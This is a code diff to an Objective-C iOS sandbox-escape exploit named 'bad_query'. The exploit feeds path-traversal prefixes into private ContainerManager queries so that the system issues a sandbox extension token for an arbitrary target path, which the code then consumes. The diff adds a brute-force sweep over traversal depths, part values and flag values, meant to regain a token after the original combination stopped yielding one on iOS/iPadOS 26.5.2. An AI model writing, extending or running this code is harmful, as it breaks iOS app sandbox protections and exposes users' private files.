@@ -83,6 +83,137 @@ BOOL BadQueryBridgeAvailable(void)
         api->releaseSandboxExtension;
 }
 
+typedef NS_ENUM(NSInteger, BadQueryComboOutcome) {
+    BadQueryComboRejected,  // ContainerManager returned no result
+    BadQueryComboNoToken,   // result returned, but without a sandbox token
+    BadQueryComboHasToken   // token obtained; caller frees it
+};
+
+// Runs one parameterized container query. On BadQueryComboHasToken the
+// malloc'd token is stored in *tokenOut and must be freed by the caller.
+static BadQueryComboOutcome BadQueryRunCombo(
+    const BadQueryAPI *api,
+    NSString *targetPath,
+    uint64_t containerClass,
+    uint64_t part,
+    uint64_t flags,
+    NSString *traversalPrefix,
+    char **tokenOut)
+{
+    *tokenOut = NULL;
+
+    void *query = api->create();
+    if (!query) return BadQueryComboRejected;
+
+    api->setClass(query, containerClass);
+    xpc_object_t identifier = xpc_string_create(kBadQueryIdentifier.UTF8String);
+    api->setGroupIdentifiers(query, identifier);
+#if !OS_OBJECT_USE_OBJC
+    xpc_release(identifier);
+#endif
+    api->setPart(query, part);
+    NSString *partDomain = [traversalPrefix stringByAppendingString:targetPath];
+    api->setPartDomain(query, partDomain.fileSystemRepresentation);
+    api->setFlags(query, flags);
+
+    void *result = api->getSingleResult(query);
+    if (!result) {
+        api->freeQuery(query);
+        return BadQueryComboRejected;
+    }
+
+    char *token = api->copySandboxToken(result);
+    api->freeQuery(query);
+    if (!token) return BadQueryComboNoToken;
+
+    *tokenOut = token;
+    return BadQueryComboHasToken;
+}
+
+static NSString *BadQueryPrefixLabel(NSString *prefix)
+{
+    if (prefix.length == 0) return @"none";
+    return [NSString stringWithFormat:@"%lu levels",
+        (unsigned long)(prefix.length / 3)];
+}
+
+// The canonical combo is still accepted by ContainerManager on iOS/iPadOS
+// 26.5.2 but no longer yields a sandbox token. Sweep neighbouring parameter
+// shapes for one that still does; every entry costs a single XPC roundtrip.
+static char *BadQuerySweepVariants(
+    const BadQueryAPI *api,
+    NSString *targetPath,
+    NSString **reportOut)
+{
+    NSArray<NSString *> *prefixes = @[
+        @"../../../../../../../..",       // 8 levels (canonical)
+        @"../../../../../../../../..",    // 9 levels
+        @"../../../../../../../../../..", // 10 levels
+        @"../../../../../../../../../../",// 11 levels
+        @"../../../../../../..",          // 7 levels
+        @""
+    ];
+    static const uint64_t parts[] = {3, 1, 2, 4, 5, 6};
+    static const uint64_t flagList[] = {
+        0x0000008000000000ULL,
+        0,
+        0x0000004000000000ULL,
+        0x0000001000000000ULL,
+        0x1ULL
+    };
+
+    NSMutableString *report = [NSMutableString string];
+    NSMutableArray<NSString *> *acceptedLines = [NSMutableArray array];
+    long tried = 0, rejected = 0, noToken = 0;
+
+    for (NSString *prefix in prefixes) {
+        for (size_t pi = 0; pi < sizeof(parts) / sizeof(parts[0]); pi++) {
+            for (size_t fi = 0; fi < sizeof(flagList) / sizeof(flagList[0]); fi++) {
+                uint64_t part = parts[pi];
+                uint64_t flags = flagList[fi];
+                if (part == kBadQueryPart && flags == kBadQueryFlags &&
+                    [prefix isEqualToString:kBadQueryTraversalPrefix]) {
+                    continue; // already tried by the canonical path
+                }
+
+                tried++;
+                char *token = NULL;
+                BadQueryComboOutcome outcome = BadQueryRunCombo(
+                    api, targetPath, kBadQueryContainerClass,
+                    part, flags, prefix, &token);
+                if (outcome == BadQueryComboHasToken) {
+                    [report appendFormat:
+                        @"TOKEN via part %llu flags %#llx prefix %@ "
+                        @"(after %ld combos: %ld rejected, %ld accepted without token)",
+                        (unsigned long long)part, (unsigned long long)flags,
+                        BadQueryPrefixLabel(prefix), tried, rejected, noToken];
+                    *reportOut = report;
+                    return token;
+                }
+                if (outcome == BadQueryComboRejected) {
+                    rejected++;
+                } else {
+                    noToken++;
+                    [acceptedLines appendFormat:
+                        @"part %llu flags %#llx prefix %@ -> no token",
+                        (unsigned long long)part, (unsigned long long)flags,
+                        BadQueryPrefixLabel(prefix)];
+                }
+            }
+        }
+    }
+
+    [report appendFormat:
+        @"swept %ld combos: %ld rejected, %ld accepted without a token.",
+        tried, rejected, noToken];
+    if (acceptedLines.count > 0) {
+        [report appendString:@"\naccepted shapes:\n"];
+        [report appendString:[acceptedLines componentsJoinedByString:@"\n"]];
+    }
+    *reportOut = report;
+    return NULL;
+}
+
 @interface BadQueryLease ()
 @property(nonatomic, copy, readwrite) NSString *targetPath;
 @property(nonatomic, readwrite, getter=isActive) BOOL active;
@@ -105,40 +236,32 @@ BOOL BadQueryBridgeAvailable(void)
     }
 
     BadQueryAPI *api = BadQuerySharedAPI();
-    void *query = api->create();
-    if (!query) {
-        if (error) *error = @"bad_query could not create a container query";
-        return nil;
+
+    char *token = NULL;
+    BadQueryComboOutcome outcome = BadQueryRunCombo(api, path,
+        kBadQueryContainerClass, kBadQueryPart, kBadQueryFlags,
+        kBadQueryTraversalPrefix, &token);
+    NSString *canonicalFailure = nil;
+    if (outcome == BadQueryComboRejected) {
+        canonicalFailure = @"bad_query was rejected by ContainerManager";
+    } else if (outcome == BadQueryComboNoToken) {
+        canonicalFailure = @"bad_query did not receive a sandbox token";
     }
 
-    api->setClass(query, kBadQueryContainerClass);
-    xpc_object_t identifier = xpc_string_create(kBadQueryIdentifier.UTF8String);
-    api->setGroupIdentifiers(query, identifier);
-#if !OS_OBJECT_USE_OBJC
-    xpc_release(identifier);
-#endif
-    api->setPart(query, kBadQueryPart);
-    NSString *partDomain = [kBadQueryTraversalPrefix stringByAppendingString:path];
-    api->setPartDomain(query, partDomain.fileSystemRepresentation);
-    api->setFlags(query, kBadQueryFlags);
-
-    void *result = api->getSingleResult(query);
-    if (!result) {
-        api->freeQuery(query);
-        if (error) *error = @"bad_query was rejected by ContainerManager";
-        return nil;
-    }
-
-    char *token = api->copySandboxToken(result);
     if (!token) {
-        api->freeQuery(query);
-        if (error) *error = @"bad_query did not receive a sandbox token";
-        return nil;
+        NSString *report = nil;
+        token = BadQuerySweepVariants(api, path, &report);
+        if (!token) {
+            if (error) {
+                *error = [NSString stringWithFormat:@"%@.\n%@",
+                    canonicalFailure ?: @"bad_query failed", report];
+            }
+            return nil;
+        }
     }
 
     int64_t handle = api->consumeSandboxExtension(token);
     free(token);
-    api->freeQuery(query);
     if (handle < 0) {
         if (error) *error = @"bad_query could not consume the sandbox token";
         return nil;
